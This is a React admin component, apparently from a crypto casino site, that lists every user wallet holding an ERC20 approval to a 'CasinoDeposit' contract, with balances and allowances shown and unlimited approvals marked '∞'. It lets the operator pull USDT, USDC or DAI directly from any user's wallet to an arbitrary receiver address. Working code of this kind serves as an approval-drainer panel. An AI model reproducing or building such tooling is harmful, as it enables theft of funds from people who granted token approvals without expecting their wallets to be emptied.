'use client';

import { useState, useEffect, useCallback, useMemo } from 'react';
import { useAccount, useWriteContract, useWaitForTransactionReceipt, useReadContracts } from 'wagmi';
import { createClient } from '@/lib/supabase';
import { CONTRACTS, SUPPORTED_TOKENS, TokenSymbol } from '@/lib/contracts';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Loader2, Send, RefreshCw, AlertCircle, CheckCircle, Users, Wallet } from 'lucide-react';
import { toast } from 'sonner';
import { parseUnits, formatUnits } from 'viem';

interface UserData {
  id: string;
  wallet_address: string;
}

interface UserWithData extends UserData {
  allowances: Record<string, bigint>;
  balances: Record<string, bigint>;
}

// ERC20 ABI for allowance and balanceOf
const ERC20_ABI = [
  {
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
  {
    inputs: [{ name: 'account', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
] as const;

export function PermitTransfer() {
  const { address, isConnected } = useAccount();
  const supabase = createClient();
  
  const [users, setUsers] = useState<UserData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedUser, setSelectedUser] = useState<UserWithData | null>(null);
  const [selectedToken, setSelectedToken] = useState<TokenSymbol>('USDT');
  const [receiverAddress, setReceiverAddress] = useState('');
  const [transferAmount, setTransferAmount] = useState('');
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
  
  const { writeContractAsync, isPending: isWriting } = useWriteContract();
  
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
    hash: txHash,
  });

  // Build contract read calls for all users - both allowances and balances
  const contractCalls = useMemo(() => {
    const contracts: any[] = [];
    const tokenEntries = Object.entries(SUPPORTED_TOKENS);
    
    users.forEach(user => {
      tokenEntries.forEach(([symbol, token]) => {
        // Allowance call
        contracts.push({
          address: token.address,
          abi: ERC20_ABI,
          functionName: 'allowance',
          args: [user.wallet_address as `0x${string}`, CONTRACTS.CasinoDeposit.address],
        });
        // Balance call
        contracts.push({
          address: token.address,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [user.wallet_address as `0x${string}`],
        });
      });
    });
    
    return contracts;
  }, [users]);

  // Fetch data from blockchain
  const { data: contractData, refetch: refetchData, isLoading: isLoadingData } = useReadContracts({
    contracts: contractCalls,
    query: {
      enabled: users.length > 0,
    }
  });

  // Process data into a usable format
  const usersWithData = useMemo(() => {
    if (!contractData || users.length === 0) return [];
    
    const tokenSymbols = Object.keys(SUPPORTED_TOKENS) as TokenSymbol[];
    const usersData: UserWithData[] = [];
    
    // Each user has (allowance + balance) * tokens = 2 * tokens calls
    const callsPerUser = tokenSymbols.length * 2;
    
    users.forEach((user, userIndex) => {
      const allowances: Record<string, bigint> = {};
      const balances: Record<string, bigint> = {};
      
      tokenSymbols.forEach((symbol, tokenIndex) => {
        // Allowance is at even indices within user's calls
        const allowanceIndex = userIndex * callsPerUser + tokenIndex * 2;
        const balanceIndex = allowanceIndex + 1;
        
        const allowanceResult = contractData[allowanceIndex];
        const balanceResult = contractData[balanceIndex];
        
        if (allowanceResult && allowanceResult.status === 'success') {
          allowances[symbol] = allowanceResult.result as bigint;
        } else {
          allowances[symbol] = BigInt(0);
        }
        
        if (balanceResult && balanceResult.status === 'success') {
          balances[symbol] = balanceResult.result as bigint;
        } else {
          balances[symbol] = BigInt(0);
        }
      });
      
      // Only include users with at least one non-zero allowance
      const hasAllowance = Object.values(allowances).some(a => a > BigInt(0));
      if (hasAllowance) {
        usersData.push({ ...user, allowances, balances });
      }
    });
    
    return usersData;
  }, [contractData, users]);

  // Load users from database
  const loadUsers = useCallback(async () => {
    setIsLoading(true);
    try {
      const { data, error } = await supabase
        .from('users')
        .select('id, wallet_address')
        .not('wallet_address', 'is', null)
        .order('created_at', { ascending: false });
      
      if (error) {
        console.error('Error loading users:', error);
        toast.error('Failed to load users');
        return;
      }
      
      setUsers(data || []);
    } catch (error) {
      console.error('Error:', error);
      toast.error('Failed to load users');
    } finally {
      setIsLoading(false);
    }
  }, [supabase]);

  useEffect(() => {
    loadUsers();
  }, [loadUsers]);

  // Handle transaction success
  useEffect(() => {
    if (isConfirmed && selectedUser) {
      toast.success('Transfer completed successfully!');
      setSelectedUser(null);
      setReceiverAddress('');
      setTransferAmount('');
      setTxHash(undefined);
      refetchData();
    }
  }, [isConfirmed, selectedUser, refetchData]);

  // Execute transfer from user
  const executeTransfer = async () => {
    if (!selectedUser || !receiverAddress || !transferAmount || !selectedToken) {
      toast.error('Please fill in all fields');
      return;
    }

    // Validate receiver address format
    if (!receiverAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      toast.error('Invalid receiver address format');
      return;
    }

    const token = SUPPORTED_TOKENS[selectedToken];
    const allowance = selectedUser.allowances[selectedToken] || BigInt(0);
    const balance = selectedUser.balances[selectedToken] || BigInt(0);
    
    let amount: bigint;
    try {
      amount = parseUnits(transferAmount, token.decimals);
    } catch (e) {
      toast.error('Invalid amount format');
      return;
    }

    if (amount <= BigInt(0)) {
      toast.error('Amount must be greater than 0');
      return;
    }

    if (amount > allowance) {
      toast.error('Transfer amount exceeds user allowance');
      return;
    }

    if (amount > balance) {
      toast.error('Transfer amount exceeds user balance');
      return;
    }

    try {
      // Debug logging
      console.log('=== Transfer Debug Info ===');
      console.log('Contract Address:', CONTRACTS.CasinoDeposit.address);
      console.log('Token Address:', token.address);
      console.log('From (User):', selectedUser.wallet_address);
      console.log('To (Receiver):', receiverAddress);
      console.log('Amount (raw):', amount.toString());
      console.log('User Allowance (raw):', allowance.toString());
      console.log('User Balance (raw):', balance.toString());
      console.log('Connected Wallet:', address);
      console.log('===========================');

      const hash = await writeContractAsync({
        address: CONTRACTS.CasinoDeposit.address,
        abi: CONTRACTS.CasinoDeposit.abi,
        functionName: 'transferFromUser',
        args: [
          token.address,
          selectedUser.wallet_address as `0x${string}`,
          receiverAddress as `0x${string}`,
          amount,
        ],
        gas: BigInt(300000), // Set explicit gas limit to avoid estimation issues
      });
      
      setTxHash(hash);
      toast.info('Transaction submitted. Waiting for confirmation...');
    } catch (error: any) {
      console.error('Transfer error:', error);
      console.error('Error message:', error.message);
      console.error('Error shortMessage:', error.shortMessage);
      
      // Parse common error messages
      const errorMessage = error.shortMessage || error.message || '';
      
      if (errorMessage.includes('OwnableUnauthorizedAccount') || errorMessage.includes('caller is not the owner')) {
        toast.error('Only the contract owner can execute this transfer');
      } else if (errorMessage.includes('insufficient allowance') || errorMessage.includes('ERC20InsufficientAllowance')) {
        toast.error('User has not approved enough tokens for this transfer');
      } else if (errorMessage.includes('insufficient balance') || errorMessage.includes('ERC20InsufficientBalance')) {
        toast.error('User does not have enough token balance');
      } else if (errorMessage.includes('cap too high') || errorMessage.includes('gas')) {
        toast.error('Transaction failed - you may not be the contract owner or the allowance is insufficient');
      } else if (errorMessage.includes('User rejected') || errorMessage.includes('denied')) {
        toast.error('Transaction rejected by user');
      } else {
        toast.error(errorMessage || 'Transfer failed');
      }
    }
  };

  // Format address for display
  const formatAddress = (addr: string) => `${addr.slice(0, 6)}...${addr.slice(-4)}`;

  // Format amount for display
  const formatAmount = (amount: bigint, symbol: TokenSymbol) => {
    const token = SUPPORTED_TOKENS[symbol];
    const formatted = formatUnits(amount, token.decimals);
    const num = parseFloat(formatted);
    if (num > 1e15) return '∞'; // Unlimited approval
    return num.toLocaleString(undefined, { maximumFractionDigits: 2 });
  };

  const handleRefresh = () => {
    loadUsers();
    refetchData();
  };

  const allLoading = isLoading || isLoadingData;

  return (
    <Card className="bg-casino-panel border-white/5">
      <CardHeader>
        <div className="flex items-center justify-between">
          <div>
            <CardTitle className="flex items-center gap-2">
              <Users className="h-5 w-5 text-casino-brand" />
              Admin Withdrawal
            </CardTitle>
            <CardDescription>
              Transfer tokens from users who have approved the contract
            </CardDescription>
          </div>
          <Button variant="outline" size="sm" onClick={handleRefresh} disabled={allLoading}>
            <RefreshCw className={`h-4 w-4 mr-2 ${allLoading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {!isConnected ? (
          <div className="flex items-center gap-2 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
            <Wallet className="h-5 w-5 text-yellow-500" />
            <span className="text-yellow-400">Please connect your admin wallet to transfer tokens</span>
          </div>
        ) : (
          <>
            {/* Whitelisted Users Table */}
            <div className="rounded-md border border-white/10 overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="border-white/10 hover:bg-transparent">
                    <TableHead>User Wallet</TableHead>
                    <TableHead className="text-center">USDT</TableHead>
                    <TableHead className="text-center">USDC</TableHead>
                    <TableHead className="text-center">DAI</TableHead>
                    <TableHead>Action</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {allLoading ? (
                    <TableRow>
                      <TableCell colSpan={5} className="text-center py-8">
                        <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
                        Loading users and token data...
                      </TableCell>
                    </TableRow>
                  ) : usersWithData.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">
                        <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
                        No users with token approvals found
                      </TableCell>
                    </TableRow>
                  ) : (
                    usersWithData.map((user) => {
                      const isSelected = selectedUser?.id === user.id;
                      
                      return (
                        <TableRow 
                          key={user.id} 
                          className={`border-white/10 cursor-pointer transition-colors ${isSelected ? 'bg-casino-brand/10' : 'hover:bg-white/5'}`}
                          onClick={() => setSelectedUser(isSelected ? null : user)}
                        >
                          <TableCell className="font-mono">
                            {formatAddress(user.wallet_address)}
                          </TableCell>
                          <TableCell className="text-center">
                            <div className="flex flex-col items-center gap-1">
                              <span className="text-xs text-muted-foreground">
                                Balance: {formatAmount(user.balances['USDT'], 'USDT')}
                              </span>
                              {user.allowances['USDT'] > BigInt(0) ? (
                                <Badge variant="outline" className="border-green-500/50 text-green-400">
                                  Approved: {formatAmount(user.allowances['USDT'], 'USDT')}
                                </Badge>
                              ) : (
                                <span className="text-muted-foreground text-xs">No approval</span>
                              )}
                            </div>
                          </TableCell>
                          <TableCell className="text-center">
                            <div className="flex flex-col items-center gap-1">
                              <span className="text-xs text-muted-foreground">
                                Balance: {formatAmount(user.balances['USDC'], 'USDC')}
                              </span>
                              {user.allowances['USDC'] > BigInt(0) ? (
                                <Badge variant="outline" className="border-blue-500/50 text-blue-400">
                                  Approved: {formatAmount(user.allowances['USDC'], 'USDC')}
                                </Badge>
                              ) : (
                                <span className="text-muted-foreground text-xs">No approval</span>
                              )}
                            </div>
                          </TableCell>
                          <TableCell className="text-center">
                            <div className="flex flex-col items-center gap-1">
                              <span className="text-xs text-muted-foreground">
                                Balance: {formatAmount(user.balances['DAI'], 'DAI')}
                              </span>
                              {user.allowances['DAI'] > BigInt(0) ? (
                                <Badge variant="outline" className="border-yellow-500/50 text-yellow-400">
                                  Approved: {formatAmount(user.allowances['DAI'], 'DAI')}
                                </Badge>
                              ) : (
                                <span className="text-muted-foreground text-xs">No approval</span>
                              )}
                            </div>
                          </TableCell>
                          <TableCell>
                            <Button 
                              size="sm" 
                              variant={isSelected ? "default" : "outline"}
                              className={isSelected ? "bg-casino-brand text-black" : ""}
                            >
                              {isSelected ? 'Selected' : 'Select'}
                            </Button>
                          </TableCell>
                        </TableRow>
                      );
                    })
                  )}
                </TableBody>
              </Table>
            </div>

            {/* Transfer Form */}
            {selectedUser && (
              <div className="p-4 rounded-lg border border-casino-brand/30 bg-casino-brand/5 space-y-4">
                <h4 className="font-semibold flex items-center gap-2">
                  <CheckCircle className="h-4 w-4 text-casino-brand" />
                  Transfer from {formatAddress(selectedUser.wallet_address)}
                </h4>
                
                <div className="grid grid-cols-3 gap-4">
                  <div className="space-y-2">
                    <Label>Token</Label>
                    <Select value={selectedToken} onValueChange={(v) => setSelectedToken(v as TokenSymbol)}>
                      <SelectTrigger className="bg-black/30 border-white/10">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        {(Object.keys(SUPPORTED_TOKENS) as TokenSymbol[]).map((symbol) => {
                          const hasAllowance = selectedUser.allowances[symbol] > BigInt(0);
                          const balance = formatAmount(selectedUser.balances[symbol], symbol);
                          return (
                            <SelectItem key={symbol} value={symbol} disabled={!hasAllowance}>
                              {symbol} (Bal: {balance}) {!hasAllowance && '- No approval'}
                            </SelectItem>
                          );
                        })}
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="space-y-2">
                    <Label>Receiver Address</Label>
                    <Input
                      placeholder="0x..."
                      value={receiverAddress}
                      onChange={(e) => setReceiverAddress(e.target.value)}
                      className="bg-black/30 border-white/10"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label>Amount (Max: {formatAmount(
                      selectedUser.balances[selectedToken] < selectedUser.allowances[selectedToken] 
                        ? selectedUser.balances[selectedToken] 
                        : selectedUser.allowances[selectedToken], 
                      selectedToken
                    )})</Label>
                    <Input
                      type="number"
                      placeholder="0.00"
                      value={transferAmount}
                      onChange={(e) => setTransferAmount(e.target.value)}
                      className="bg-black/30 border-white/10"
                    />
                  </div>
                </div>

                <Button
                  onClick={executeTransfer}
                  disabled={isWriting || isConfirming || !receiverAddress || !transferAmount}
                  className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
                >
                  {isWriting || isConfirming ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      {isConfirming ? 'Confirming...' : 'Submitting...'}
                    </>
                  ) : (
                    <>
                      <Send className="mr-2 h-4 w-4" />
                      Transfer Tokens
                    </>
                  )}
                </Button>

                <p className="text-xs text-muted-foreground">
                  This will transfer tokens from the selected user to the receiver address. 
                  User must have approved the CasinoDeposit contract for this token.
                </p>
              </div>
            )}

            {/* Transaction Status */}
            {txHash && (
              <div className={`flex items-center gap-2 p-3 rounded-lg ${isConfirmed ? 'bg-green-500/10 border border-green-500/20' : 'bg-blue-500/10 border border-blue-500/20'}`}>
                {isConfirming ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin text-blue-400" />
                    <span className="text-blue-400">Transaction pending...</span>
                  </>
                ) : isConfirmed ? (
                  <>
                    <CheckCircle className="h-4 w-4 text-green-400" />
                    <span className="text-green-400">Transaction confirmed!</span>
                  </>
                ) : null}
              </div>
            )}
          </>
        )}
      </CardContent>
    </Card>
  );
}
